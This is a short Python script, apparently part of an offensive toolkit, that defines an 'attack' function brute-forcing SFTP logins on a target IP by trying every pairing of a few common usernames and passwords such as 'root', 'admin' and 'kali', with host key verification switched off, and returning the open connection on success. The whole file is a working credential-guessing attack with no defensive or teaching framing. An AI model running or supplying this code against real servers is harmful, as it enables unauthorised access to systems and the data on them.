import pysftp as sftp
from colorama import Fore, init, Back, Style
from termcolor import colored

def attack(ip):
	init()
	CnOpts = sftp.CnOpts()
	CnOpts.hostkeys = None
	userpass = ['kali', 'admin', 'root', 'peace', 'war']
	for username in userpass:
		for password in userpass:
			try:
				print(colored(Fore.YELLOW + ip + ' --> ' + username + '  ' + password))
				handle = sftp.Connection(host = ip, username=username, password = password, cnopts=CnOpts)
				print(colored(Fore.GREEN + 'Username: ' + username + '\nPassword: ' + password))
				return handle
			except:
				pass
